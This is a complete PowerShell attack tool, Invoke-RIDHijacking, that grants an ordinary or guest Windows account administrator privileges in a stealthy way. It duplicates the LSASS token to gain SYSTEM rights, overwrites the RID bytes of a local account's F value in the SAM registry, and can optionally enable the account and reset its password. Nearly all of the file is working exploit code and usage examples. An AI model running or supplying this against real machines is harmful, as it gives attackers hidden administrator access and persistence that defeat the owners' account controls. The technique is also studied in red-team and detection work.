#Requires -Version 2

function Invoke-RIDHijacking {

<#

.SYNOPSIS
This script will create an entry on the target by modifying some properties of an existing account.
It will change the account attributes by setting a Relative Identifier (RID), which should be owned 
by one existing account on the destination machine.

Taking advantage of some Windows Local Users Management integrity issues, this module will allow to 
authenticate with one known account credentials (like GUEST account), and access with the privileges 
of another existing account (like ADMINISTRATOR account), even if the spoofed account is disabled.
    
Author: Sebastian Castro @r4wd3r. E-mail: r4wd3r@gmail.com. Twitter: @r4wd3r.
License: BSD 3-Clause

.DESCRIPTION
The RID Hijacking technique allows setting desired privileges to an existent account in a stealthy manner
by modifying the Relative Identifier value copy used to create the access token. This module needs administrative privileges. 

.PARAMETER User
User account to use as the hijacker. If -UseGuest, this parameter will be ignored.

.PARAMETER Password
Password value to set for the hijacker account.

.PARAMETER RID 
RID number in decimal of the victim account. Should be the RID of an existing account. 500 by default.

.PARAMETER UseGuest
Set GUEST built-in account as the destination of the privileges to be hijacked.

.PARAMETER Enable
Enable the hijacker account via registry modification.

.EXAMPLE
Invoke-RIDHijacking -User alice -RID 500
Set Administrator privileges to alice custom user. 

.EXAMPLE
Invoke-RIDHijacking -User alice -RID 500 -Password Password1
Set Administrator privileges to alice custom user and set new password for alice.

.EXAMPLE
Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable
Set Administrator privileges to alice custom user, set new password for alice and enable alice's account.

.EXAMPLE
Invoke-RIDHijacking -UseGuest -RID 500
Set Administrator privileges to Guest Account. This could also work with the command Invoke-RIDHijacking -Guest.

.EXAMPLE
Invoke-RIDHijacking -UseGuest -RID 500 -Password Password1
Set Administrator privileges to Guest Account and setting new password for Guest.

.EXAMPLE
Invoke-RIDHijacking -UseGuest -RID 1001
Set custom account privileges to Guest Account. A custom local user with RID 1001 should exist.

.EXAMPLE
Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1
Set custom account privileges to Guest Account and set new password for Guest. A custom local user with 
RID 1001 should exist.

.EXAMPLE
Invoke-RIDHijacking -User alice -RID 1002 -Password Password1 -Enable
Set custom account privileges to alice custom user, set new password for alice and enable alice's account. 
A custom local user with RID 1002 should exist.

.NOTES
Elevates privileges with LSASS token duplication:
https://gallery.technet.microsoft.com/scriptcenter/Enable-TSDuplicateToken-6f485980
Access to local users data stored in registry based on Get-LocalUsersInfo
https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Get-username-fdcb6990


.LINK
https://csl.com.co/rid-hijacking/
https://r4wsecurity.blogspot.com/2017/12/rid-hijacking-maintaining-access-on.html
https://github.com/r4wd3r/RID-Hijacking

#>
  [CmdletBinding()] param(
    [Parameter(Position = 0,Mandatory = $False)]
    [string]
    $User,

    [string]
    $Password,

    [switch]
    $UseGuest,

    [ValidateRange(500,65535)]
    [int]
    $RID = 500,

    [switch]
    $Enable
  )

  begin {
    # Checks SYSTEM privileges in the current thread or tries to elevate them via duplicating LSASS access token.
    Write-Verbose "Checking for SYSTEM privileges"
    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {
      Write-Output "[+] Process is already running as SYSTEM"
    }
    else {
      try {
        Write-Verbose "Trying to get SYSTEM privileges"
        Enable-TSDuplicateToken
        Write-Output "[+] Elevated to SYSTEM privileges"
      }
      catch {
        throw "Administrator or SYSTEM privileges are required"
      }
    }

    # Obtains the needed registry values for each local user
    $localUsers = Get-UserKeys
    $currentUser = $null
  }

  process {

    # Set to currentUser the account to be used as the hijacker.
    Write-Verbose "Checking users..."
    if ($UseGuest) {
      $currentUser = $localUsers | Where-Object { $_.RID -eq 501 }
    }
    else {
      if ($User) {
        $currentUser = $localUsers | Where-Object { $_.UserName -contains $User }
      }
    }

    # Verifies if the entered account exists.
    if ($currentUser) {
      "[+] Found {0} account" -f ($currentUser.UserName)
      "[+] Target account username: {0}" -f $currentUser.UserName
      "[+] Target account RID: {0}" -f $currentUser.RID
    }
    else {
      throw "User does not exists in system"
    }

    # Creates a copy of the user's F REG_BINARY with requested modifications
    $FModified = New-Object Byte[] $currentUser.F.length
    for ($i = 0; $i -lt $currentUser.F.length; $i++) {
      if ($Enable -and ($i -eq 56)) {
        $FModified[$i] = 20
        continue
      }
      # Sets the new RID in the F REG_BINARY copy
      if ($RID -and ($i -eq 48)) {
        $hexRid = [byte[]][BitConverter]::GetBytes($RID)
        $FModified[$i],$FModified[$i + 1] = $hexRid[0],$hexRid[1]
        $i++
        continue
      }
      $FModified[$i] = $currentUser.F[$i]
    }

    "[*] Current RID value in F for {0}: {1:x2}{2:x2}" -f ($currentUser.UserName,$currentUser.F[49],$currentUser.F[48])
    "[*] Setting RID $RID ({1:x2}{2:x2}) in F for {0} " -f ($currentUser.UserName,$FModified[49],$FModified[48])

    # Writes changes to Registry
    $fPath = "HKLM:\SAM\SAM\Domains\Account\Users\{0:x8}" -f $currentUser.RID

    try {
      Write-Verbose "Writing changes to registry: $fPath"
      Set-ItemProperty -Path $fPath -Name F -Value $FModified
    }
    catch {
      throw "Error writing in registry. Path: $fPath"
    }

    if ($Enable) {
      Write-Output "[+] Account has been enabled"
    }

    if ($Password) {
      Write-Output "[*] Setting password to user..."
      net user $currentUser.UserName $Password
      Write-Output "[+] Password set to $Password"
    }
    "[+] SUCCESS: The RID $RID has been set to the account {0} with original RID {1}" -f ($currentUser.UserName,$currentUser.RID)
  }
}

function Get-UserName ([byte[]]$V) {
  if (-not $V) { return $null };
  $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
  $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
  return [Text.Encoding]::Unicode.GetString($V,$offset,$len);
}

function Get-UserKeys {
  Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users |
  Where-Object { $_.PSChildName -match "^[0-9A-Fa-f]{8}$" } |
  Add-Member AliasProperty KeyName PSChildName -Passthru |
  Add-Member ScriptProperty UserName { Get-UserName ($this.GetValue("V")) } -Passthru |
  Add-Member ScriptProperty Rid { [Convert]::ToInt32($this.PSChildName,16) } -Passthru |
  Add-Member ScriptProperty F { [byte[]]($this.GetValue("F")) } -Passthru |
  Add-Member ScriptProperty FRid { [BitConverter]::ToUInt32($this.GetValue("F")[0x30..0x34],0) } -Passthru
}

function Enable-TSDuplicateToken {

  $signature = @"
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct TokPriv1Luid
     {
         public int Count;
         public long Luid;
         public int Attr;
     }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_QUERY = 0x00000008;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;

    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
      TOKEN_ADJUST_SESSIONID);

    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
    public const int ANYSIZE_ARRAY = 1;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
      public UInt32 LowPart;
      public UInt32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }


    public struct TOKEN_PRIVILEGES {
      public UInt32 PrivilegeCount;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
      public LUID_AND_ATTRIBUTES [] Privileges;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);


    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetThreadToken(
      IntPtr PHThread,
      IntPtr Token
    );

    [DllImport("advapi32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool OpenProcessToken(IntPtr ProcessHandle, 
       UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
"@

  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())
  if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
    throw "Run the Command as an Administrator"
    break
  }

  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv
  $adjPriv = [AdjPriv.AdjPriv]
  [long]$luid = 0

  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid
  $tokPriv1Luid.Count = 1
  $tokPriv1Luid.Luid = $luid
  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED

  $retVal = $adjPriv::LookupPrivilegeValue($null,"SeDebugPrivilege",[ref]$tokPriv1Luid.Luid)

  [IntPtr]$htoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(),[AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS,[ref]$htoken)


  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES
  $retVal = $adjPriv::AdjustTokenPrivileges($htoken,$false,[ref]$tokPriv1Luid,12,[IntPtr]::Zero,[IntPtr]::Zero)

  if (-not ($retVal)) {
    [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    break
  }

  $process = (Get-Process -Name lsass)
  [IntPtr]$hlsasstoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($process.Handle,([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -bor [AdjPriv.AdjPriv]::TOKEN_DUPLICATE),[ref]$hlsasstoken)

  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero
  $retVal = $adjPriv::DuplicateToken($hlsasstoken,2,[ref]$dulicateTokenHandle)

  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero,$dulicateTokenHandle)
  if (-not ($retVal)) {
    [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
  }
}
